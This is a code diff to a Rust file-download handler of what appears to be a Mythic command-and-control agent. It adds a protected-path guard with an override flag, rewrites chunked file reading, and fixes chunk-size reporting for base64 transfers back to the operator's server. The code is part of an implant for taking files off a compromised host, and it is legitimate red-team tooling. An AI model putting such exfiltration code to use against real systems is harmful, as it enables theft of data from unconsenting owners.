@@ -21,7 +21,7 @@
 //! ```
 
 use std::fs::File;
-use std::io::{Read, Seek, SeekFrom};
+use std::io::Read;
 use std::path::Path;
 
 use base64::Engine;
@@ -29,6 +29,7 @@ use mythic::{TaskDownload, TaskMessage, TaskResponse};
 use serde::Deserialize;
 use uuid::Uuid;
 
+use crate::common::pathguard::is_protected_path;
 use crate::push_extra;
 
 // ── Params ──────────────────────────────────────────────────
@@ -41,6 +42,9 @@ struct Params {
     /// Chunk size in bytes (default 512 KiB). Clamped to [64 KiB, 8 MiB].
     #[serde(default)]
     chunk_size: Option<u32>,
+    /// When true, allow exfiltrating system paths (default false).
+    #[serde(default)]
+    allow_system_path: bool,
 }
 
 // ── Constants ───────────────────────────────────────────────
@@ -58,6 +62,16 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         Ok(p) => p,
         Err(e) => return TaskResponse::failed(task.id, &format!("download parse error: {e}")),
     };
+
+    if !params.allow_system_path && is_protected_path(&params.path) {
+        return TaskResponse::failed(
+            task.id,
+            &format!(
+                "refusing to download system path {}; set allow_system_path=true to override",
+                params.path
+            ),
+        );
+    }
 
     let path = Path::new(&params.path);
     let filename = path
@@ -113,40 +127,56 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         full_path, total_size, total_chunks, chunk_size
     );
 
-    // 3. Stream- read each chunk, base64-encode, push as extra response
+    // 3. Stream-read each chunk, base64-encode, push as extra response.
+    //    Single read buffer reused across chunks; no seek (sequential read).
+    //    Memory is bounded to ~chunk_size regardless of file size.
     let mut buf = vec![0u8; chunk_size as usize];
     let mut bytes_sent: u64 = 0;
     let mut chunk_num: u32 = 0;
 
     while bytes_sent < total_size {
         chunk_num += 1;
-        let to_read = ((total_size - bytes_sent) as usize).min(buf.len());
-        let slice = &mut buf[..to_read];
-
-        if let Err(e) = file.seek(SeekFrom::Start(bytes_sent)) {
-            return TaskResponse::failed(
-                task.id,
-                &format!("seek {} failed at byte {}: {e}", path.display(), bytes_sent),
-            );
+        // Read up to the buffer's capacity, but never past the end of file.
+        let want = ((total_size - bytes_sent) as usize).min(buf.len());
+        let mut filled = 0usize;
+        while filled < want {
+            match file.read(&mut buf[filled..want]) {
+                Ok(0) => {
+                    // EOF before we hit total_size — file shrank or metadata
+                    // was stale. Treat as a clean end-of-transfer.
+                    break;
+                }
+                Ok(n) => filled += n,
+                Err(e) => {
+                    return TaskResponse::failed(
+                        task.id,
+                        &format!(
+                            "read {} failed at byte {}/{}: {e}",
+                            path.display(),
+                            bytes_sent + filled as u64,
+                            total_size
+                        ),
+                    );
+                }
+            }
         }
-        if let Err(e) = file.read_exact(slice) {
-            return TaskResponse::failed(
-                task.id,
-                &format!(
-                    "read {} failed at byte {}/{}: {e}",
-                    path.display(),
-                    bytes_sent,
-                    total_size
-                ),
-            );
+        if filled == 0 {
+            // Nothing more to send — break the loop cleanly.
+            break;
         }
 
-        let read_len = slice.len();
-        let this_chunk_size = read_len as u32;
-        let encoded = base64::engine::general_purpose::STANDARD.encode(slice);
-        bytes_sent += read_len as u64;
+        // chunk_size in TaskDownload is the *uniform* chunk size used to
+        // pre-allocate Mythic's reassembly buffer. Sending the actual length
+        // of the (potentially smaller) last chunk confuses the server; the
+        // value must be the same on every chunk of a given transfer.
+        let encoded = base64::engine::general_purpose::STANDARD.encode(&buf[..filled]);
+        bytes_sent += filled as u64;
         let is_last = bytes_sent >= total_size;
 
+        // Push the chunk via extras on every iteration, including the last
+        // one. Mythic's reassembly is keyed on (task_id, file_id) so the
+        // final summary `TaskResponse` (returned below) can carry the
+        // completion flag without racing with the chunk push.
         push_extra(TaskResponse {
             task_id: task.id,
             completed: Some(is_last),
@@ -154,7 +184,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             user_output: None,
             download: Some(TaskDownload {
                 total_chunks: Some(total_chunks),
-                chunk_size: Some(this_chunk_size),
+                chunk_size: Some(chunk_size),
                 chunk_num: Some(chunk_num),
                 chunk_data: Some(encoded),
                 filename: Some(filename.clone()),
